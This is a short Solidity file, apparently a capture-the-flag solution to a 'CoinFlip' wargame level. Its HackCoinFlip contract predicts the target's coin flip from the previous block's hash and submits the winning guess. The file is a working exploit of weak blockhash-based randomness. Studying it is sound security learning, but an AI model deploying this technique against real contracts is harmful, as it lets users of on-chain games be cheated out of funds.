pragma solidity ^0.5.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {
    function flip(bool _guess) public;
}

contract HackCoinFlip {
    using SafeMath for uint;
    CoinFlip public originalContract;

    constructor(address coinFlipAddress) public {
        originalContract = CoinFlip(coinFlipAddress);
    }

    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() public {
        uint blockValue = uint(blockhash(block.number.sub(1)));
        uint coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        originalContract.flip(side);
    }
}
